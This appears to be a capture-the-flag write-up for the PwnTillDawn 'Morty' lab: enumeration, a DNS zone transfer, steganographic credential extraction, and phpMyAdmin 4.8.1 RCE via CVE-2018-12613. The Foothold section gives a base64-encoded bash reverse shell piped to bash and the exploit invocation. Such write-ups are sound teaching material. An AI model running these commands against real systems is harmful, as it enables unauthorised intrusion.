[Morty](https://online.pwntilldawn.com/Target/Show/) from [PwnTillDawn](https://online.pwntilldawn.com/) is a challenge that involves using steganography to extract hidden files from images, followed by exploiting a remote code execution (RCE) vulnerability to gain a foothold.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.150.150.57
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION

```

We found three open ports, first is 22 running SSH, 53 is DNS and finally 80 is an apache web server.

### Web

Let's browse to the website.

![webiste](1.png)

We found `note.html`, clicking on it gives us the following message.

```text
Morty,
if you read this: I've already configured your domain 'mortysserver.com' on this server, don't bother me with it anymore!!
-Rick 
```

We discovered the domain `mortysserver.com` that we need to add to our `/etc/hosts` file. We can do that using the following command.

```terminal
echo '10.150.150.57 mortysserver.com' | tee -a /etc/hosts
```

Now let's navigate to the domain.

![domain](2.png)

The site load an image of rick and morty with the text `Is this a password`, and we also notice the `Fl4sk#!` text in the image, could it be the password they are talking about? I'll make a note of that and continue

#### DNS

Since we have a DNS server and a domain let's see if we can find any other information.

Let's do a zone transfer using the following command.

```bash
dig axfr mortysserver.com @10.150.150.57 
```

```terminal
; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr mortysserver.com @10.150.150.57
;; global options: +cmd
mortysserver.com.       900     IN      SOA     10.150.150.57. email.mortysserver.com. 1 900 900 604800 900
mortysserver.com.       900     IN      NS      10.150.150.57.
rickscontrolpanel.mortysserver.com. 900 IN A    10.150.150.57
mortysserver.com.       900     IN      SOA     10.150.150.57. email.mortysserver.com. 1 900 900 604800 900
;; Query time: 93 msec

;; WHEN: Thu Apr 17 08:50:34 +01 2025
;; XFR size: 4 records (messages 1, bytes 212)
```

We discovered the subdomain `rickscontrolpanel.mortysserver.com`, let's add it to /etc/hosts and browse to it.

![phpmyadmin](3.png)

We found the login page of `phpmyadmin`, I tried couple default credentials as web as the `Fl4sk#!` password we found but nothing worked.

#### Steganography

Looking back at the first domain, we see that the password is part of the image, here I guessed the image might be hiding something.

I downloaded the image using the following command.

```bash
wget http://mortysserver.com/screen.jpeg
```

First I'll use `exiftool` to check if there is any interesting metadata.

```terminal
â””â”€â”€â•¼[â˜…]$ exiftool screen.jpeg
ExifTool Version Number         : 12.57
File Name                       : screen.jpeg

Image Width                     : 1256
Image Height                    : 628

Megapixels                      : 0.789
```

Nothing really.

We'll move to steghide which is a tool that can help us extract any embedded files inside the image.

```terminal
â”Œâ”€â”€[10.66.66.230]â”€[siriusðŸ’€parrot]-[~/ctf/ptd/morty]
â””â”€â”€â•¼[â˜…]$ steghide extract -sf screen.jpeg
Enter passphrase: Fl4sk#!
wrote extracted data to "keytotheuniverse.txt".
                                                                                                                                                                                              
â”Œâ”€â”€[10.66.66.230]â”€[siriusðŸ’€parrot]-[~/ctf/ptd/morty]
â””â”€â”€â•¼[â˜…]$ cat keytotheuniverse.txt 
rick:WubbaLubbaDubDub1!
```

We got prompt for a password and I submitted the one we found `Fl4sk#!` and this managed to give us a file that holds some credentials.

Now back to `phpmyadmin` let's login with the newly found username/password.

![loggedin](4.png)

## **Foothold**

After loggin in we see the version of phpmyadmin running is `4.8.1`, a quick search on google we find an RCE [CVE-2018-12613](https://nvd.nist.gov/vuln/detail/cve-2018-12613).

The exploit I'll be using can be found at <https://www.exploit-db.com/exploits/50457>

```terminal
[â˜…]$ python exploit.py rickscontrolpanel.mortysserver.com 80 / rick 'WubbaLubbaDubDub1!' id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We got command execution, now let's get a shell.

I'll use the following bash rev shell and encode it with base64.

```bash
echo 'bash -i >& /dev/tcp/10.66.66.230/9001 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC42Ni42Ni4yMzAvOTAwMSAwPiYxCg==
```

I'll setup a netcat listener and run the exploit again.

```bash
python exploit.py rickscontrolpanel.mortysserver.com 80 / rick 'WubbaLubbaDubDub1!' 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC42Ni42Ni4yMzAvOTAwMSAwPiYxCg==|base64 -d|bash'
```

I used echo to pass the encoded revshell to base64 -d which would decode it, then pipe it to bash to have it executed.

Now if we check our listener we will find the shell.

```terminal
[â˜…]$ nc -lvnp 9001                                             
listening on [any] 9001 ...
connect to [10.66.66.230] from (UNKNOWN) [10.150.150.57] 43504
bash: cannot set terminal process group (1119): Inappropriate ioctl for device
bash: no job control in this shell
www-data@morty:/var/www/html/rickscontrolpanel/public_html/phpmyadmin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@morty:/var/www/html/rickscontrolpanel/public_html/phpmyadmin$
```

Here the challenge ends and we are not required to do any privilege escalation unfortunately :(.
